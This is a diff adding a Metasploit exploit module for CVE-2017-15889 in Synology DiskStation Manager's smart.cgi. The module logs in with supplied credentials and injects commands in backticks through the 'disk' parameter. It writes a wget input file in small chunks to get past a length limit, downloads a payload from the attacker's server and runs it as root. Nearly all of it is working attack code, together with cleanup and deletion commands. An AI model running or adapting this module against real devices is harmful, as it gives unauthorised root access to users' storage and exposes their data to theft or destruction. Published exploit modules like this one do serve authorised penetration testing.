@@ -1,0 +1,209 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HttpServer
+  include Msf::Exploit::FileDropper
+
+  DEVICE_INFO_PATTERN = /major=(?<major>\d+)&minor=(?<minor>\d+)&build=(?<build>\d+)
+                        &junior=\d+&unique=synology_\w+_(?<model>[^&]+)/x.freeze
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Synology DiskStation Manager smart.cgi Remote Command Execution',
+        'Description' => %q{
+          This module exploits a vulnerability found in Synology DiskStation Manager (DSM)
+          versions < 5.2-5967-5, which allows the execution of arbitrary commands under root
+          privileges after website authentication.
+          The vulnerability is located in webman/modules/StorageManager/smart.cgi, which
+          allows appending of a command to the device to be scanned.  However, the command
+          with drive is limited to 30 characters.  A somewhat valid drive name is required,
+          thus /dev/sd is used, even though it doesn't exist.  To circumvent the character
+          restriction, a wget input file is staged in /a, and executed to download our payload
+          to /b.  From there the payload is executed.  A wfsdelay is required to give time
+          for the payload to download, and the execution of it to run.
+        },
+        'Author' =>
+          [
+            'Nigusu Kassahun', # Discovery
+            'h00die' # metasploit module
+          ],
+        'References' =>
+          [
+            [ 'CVE', '2017-15889' ],
+            [ 'EDB', '43190' ],
+            [ 'URL', 'https://ssd-disclosure.com/ssd-advisory-synology-storagemanager-smart-cgi-remote-command-execution/' ],
+            [ 'URL', 'https://synology.com/en-global/security/advisory/Synology_SA_17_65_DSM' ]
+          ],
+        'Privileged' => true,
+        'Stance' => Msf::Exploit::Stance::Aggressive,
+        'Platform' => ['python'],
+        'Arch' => [ARCH_PYTHON],
+        'Targets' =>
+          [
+            ['Automatic', {}]
+          ],
+        'DefaultTarget' => 0,
+        'DefaultOptions' => {
+          'PrependMigrate' => true,
+          'WfsDelay' => 10
+        },
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => 'Nov 08 2017'
+      )
+    )
+
+    register_options(
+      [
+        Opt::RPORT(5000),
+        OptString.new('TARGETURI', [true, 'The URI of the Synology Website', '/']),
+        OptString.new('USERNAME', [true, 'The Username for Synology', 'admin']),
+        OptString.new('PASSWORD', [true, 'The Password for Synology', ''])
+      ]
+    )
+
+    register_advanced_options [
+      OptBool.new('ForceExploit', [false, 'Override check result', false])
+    ]
+  end
+
+  def check
+    vprint_status('Trying to detect installed version')
+
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'webman', 'info.cgi'),
+      'vars_get' => { 'host' => '' }
+    })
+
+    if res && (res.code == 200) && res.body =~ DEVICE_INFO_PATTERN
+      version = "#{$LAST_MATCH_INFO[:major]}.#{$LAST_MATCH_INFO[:minor]}"
+      build = $LAST_MATCH_INFO[:build]
+      model = $LAST_MATCH_INFO[:model].sub(/^[a-z]+/) { |s| s[0].upcase }
+      model = "DS#{model}" unless model =~ /^[A-Z]/
+    else
+      vprint_error('Detection failed')
+      return CheckCode::Unknown
+    end
+
+    vprint_status("Model #{model} with version #{version}-#{build} detected")
+
+    case version
+    when '3.0', '4.0', '4.1', '4.2', '4.3', '5.0', '5.1'
+      return CheckCode::Appears
+    when '5.2'
+      return CheckCode::Appears if build < '5967-5'
+    end
+
+    CheckCode::Safe
+  end
+
+  def on_request_uri(cli, _request, cookie, token)
+    print_good('HTTP Server request received, sending payload')
+    send_response(cli, payload.encoded)
+    print_status('Executing payload')
+    inject_request(cookie, token, 'python b')
+  end
+
+  def inject_request(cookie, token, cmd = '')
+    send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'webman', 'modules', 'StorageManager', 'smart.cgi'),
+      'cookie' => cookie,
+      'headers' => {
+        'X-SYNO-TOKEN' => token
+      },
+      'vars_post' => {
+        'action' => 'apply',
+        'operation' => 'quick',
+        'disk' => "/dev/sd`#{cmd}`"
+      }
+    })
+  end
+
+  def login
+    # If you try to debug login through the browser, you'll see that desktop.js calls
+    # ux-all.js to do an RSA encrypted login.
+    # Wowever in a stroke of luck Mrs. h00die caused
+    # a power sag while tracing/debugging the loging, causing the NAS to power off.
+    # when that happened, it failed to get the crypto vars, and defaulted to a
+    # non-encrypted login, which seems to work just fine.  greetz Mrs. h00die!
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'webman', 'login.cgi'),
+      'vars_get' => { 'enable_syno_token' => 'yes' },
+      'vars_post' => {
+        'username' => datastore['USERNAME'],
+        'passwd' => datastore['PASSWORD'],
+        'OTPcode' => '',
+        '__cIpHeRtExT' => '',
+        'client_time' => Time.now.to_i,
+        'isIframeLogin' => 'yes'
+      }
+    })
+    if res && %r{<div id='synology'>(?<json>.*)</div>}m =~ res.body
+      result = JSON.parse(json)
+
+      fail_with(Failure::BadConfig, 'Incorrect Username/Password') if result['result'] == 'error'
+      if result['result'] == 'success'
+        return res.get_cookies, result['SynoToken']
+      end
+
+      fail_with(Failure::Unknown, "Unknown response: #{result}")
+    end
+  end
+
+  def exploit
+    unless check == CheckCode::Appears
+      unless datastore['ForceExploit']
+        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
+      end
+      print_warning 'Target does not appear to be vulnerable'
+    end
+
+    if datastore['SRVHOST'] == '0.0.0.0'
+      fail_with(Failure::BadConfig, 'SRVHOST must be set to an IP address (0.0.0.0 is invalid) for exploitation to be successful')
+    end
+
+    begin
+      print_status('Attempting Login')
+      cookie, token = login
+
+      start_service({ 'Uri' => {
+        'Proc' => proc do |cli, req|
+          on_request_uri(cli, req, cookie, token)
+        end,
+        'Path' => '/'
+      } })
+
+      print_status('Cleaning env')
+      inject_request(cookie, token, cmd = 'rm -rf /a')
+      inject_request(cookie, token, cmd = 'rm -rf b')
+      command = "#{datastore['SRVHOST']}:#{datastore['SRVPORT']}".split(//)
+      command_space = 22 - "echo -n ''>>/a".length
+      command_space -= 1
+      command.each_slice(command_space) do |a|
+        a = a.join('')
+        vprint_status("Staging wget with: echo -n '#{a}'>>/a")
+        inject_request(cookie, token, cmd = "echo -n '#{a}'>>/a")
+      end
+      print_status('Requesting payload pull')
+      register_file_for_cleanup('/usr/syno/synoman/webman/modules/StorageManager/b')
+      register_file_for_cleanup('/a')
+      inject_request(cookie, token, cmd = 'wget -i /a -O b')
+      # at this point we let the HTTP server call the last stage
+      # wfsdelay should be long enough to hold out for everything to download and run
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
+    end
+
+  end
+end
